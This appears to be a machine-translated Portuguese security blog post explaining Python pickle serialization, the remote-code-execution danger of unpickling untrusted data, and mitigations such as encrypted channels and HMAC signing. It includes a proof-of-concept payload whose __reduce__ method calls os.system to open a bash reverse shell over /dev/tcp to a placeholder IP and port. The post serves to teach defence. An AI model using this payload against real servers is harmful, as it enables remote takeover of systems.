Entendendo o Python decapagem e como usá-lo com segurança

postado porAshutosh Agrawalterça-feira, 18 de novembro de 2014

Em Python, você pode usar pickle para serializar (desserializar) uma estrutura de objeto em (de) um fluxo de bytes. Aqui estão as melhores práticas para decapagem segura do Python.

Por Ashutosh Agrawal , consultor sênior, e Arvind Balaji , consultor associado, Synopsys

Pickle em Python é usado principalmente na serialização e desserialização de uma estrutura de objeto Python . Em outras palavras, é o processo de converter um objeto Python em um fluxo de bytes para armazená-lo em um arquivo/banco de dados, manter o estado do programa entre sessões ou transportar dados pela rede. O fluxo de bytes em decapagem pode ser usado para recriar a hierarquia de objetos original descompactando o fluxo. Todo esse processo é semelhante à serialização de objetos em Java ou .Net.

Quando um fluxo de bytes é descompactado, o módulo pickle cria primeiro uma instância do objeto original e, em seguida, preenche a instância com os dados corretos. Para conseguir isso, o fluxo de bytes contém apenas os dados específicos da instância do objeto original. Mas ter apenas os dados por si só pode não ser suficiente. Para descompactar o objeto com sucesso, o fluxo de bytes selecionado contém instruções para o descompactador para reconstruir a estrutura do objeto original junto com os operandos de instrução, que ajudam a preencher a estrutura do objeto.

De acordo com a documentação do módulo de decapagem, os seguintes tipos podem ser decapados:

  • Nenhum, verdadeiro e falso
  • Inteiros, inteiros longos, números de ponto flutuante, números complexos
  • Cadeias normais e Unicode
  • Tuplas, listas, conjuntos e dicionários contendo apenas objetos picklable
  • Funções definidas no nível superior de um módulo
  • Funções integradas definidas no nível superior de um módulo
  • Classes que são definidas no nível superior de um módulo

Pickle permite que diferentes objetos declarem como devem ser conservados usando o método __reduce__. Sempre que um objeto é selecionado, o método __reduce__ definido por ele é chamado. Esse método retorna uma string, que pode representar o nome de um global do Python, ou uma tupla descrevendo como reconstruir esse objeto ao descompactar.

Geralmente a tupla consiste em dois argumentos:

  • Um callable (que na maioria dos casos seria o nome da classe a ser chamada)
  • Argumentos a serem passados ​​para o callable acima

A biblioteca pickle selecionará cada componente da tupla separadamente e chamará o callable nos argumentos fornecidos para construir o novo objeto durante o processo de remoção de picles.

Perigos da decapagem Python

Como não há maneiras eficazes de verificar o fluxo de pickle sendo descompactado, é possível fornecer um código de shell malicioso como entrada, causando a execução remota de código. O cenário de ataque mais comum que leva a isso seria confiar nos dados brutos do pickle recebidos pela rede. Se a conexão não for criptografada, o pickle recebido também pode ter sido modificado no fio. Outro cenário de ataque é quando um invasor pode acessar e modificar os arquivos pickle armazenados de caches, sistemas de arquivos ou bancos de dados.

O código de exemplo a seguir demonstra um programa cliente-servidor simples. O servidor se conecta a uma porta específica e espera que o cliente envie dados. Depois de receber os dados, ele os descompacta.

conn,addr = self.receiver_socket.accept()
dados = conn.recv(1024)
return cPickle.loads(dados)

Se o cliente não for confiável, um invasor pode obter código remoto para execução no servidor e obter acesso a ele.

class Shell_code(objeto):
  def __reduce__(self):
          return (os.system,('/bin/bash -i >& /dev/tcp/"IP do cliente"/"Listening PORT" 0>&1',))
shell = cPickle.dumps(Shell_code())
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(('IP do servidor','Porta do servidor'))
client_socket.send(shell)

Boas práticas em picles

O módulo de picles não é inerentemente inseguro. As práticas recomendadas a seguir permitem a implementação segura de picles.

  • Um cliente não confiável ou um servidor não confiável pode causar a execução remota de código. Assim, o picles nunca deve ser usado entre partes desconhecidas.
  • Certifique-se de que as partes que trocam picles tenham uma conexão de rede criptografada. Isso evita a alteração ou reprodução de dados no fio.
  • Se não for possível ter uma conexão segura, qualquer alteração no pickle pode ser verificada usando uma assinatura criptográfica . Pickle pode ser assinado antes do armazenamento ou transmissão, e sua assinatura pode ser verificada antes de carregá-lo no lado do receptor.
  • Em cenários em que os dados do pickle são armazenados, revise as permissões do sistema de arquivos e garanta o acesso protegido aos dados.

O código de exemplo a seguir demonstra a assinatura e a verificação criptográficas. A assinatura criptográfica, como mencionado acima, ajuda a detectar qualquer alteração de dados em conserva. O cliente usa HMAC para assinar os dados. Ele envia o valor do resumo junto com os dados em conserva para o servidor, conforme mostrado abaixo.

pickled_data = pickle.dumps(data)
digest = hmac.new('chave compartilhada', pickled_data, hashlib.sha1).hexdigest()
cabeçalho = '%s' % (resumo)
conn.send(header + ' ' + pickled_data)

O servidor recebe os dados, calcula o resumo e o verifica com o que foi enviado.

conn,addr = self.receiver_socket.accept()
dados = conn.recv(1024)
recvd_digest, pickled_data = data.split(' ')
new_digest = hmac.new('chave compartilhada', pickled_data, hashlib.sha1).hexdigest()
if recvd_digest != new_digest:
    print 'Falha na verificação de integridade'
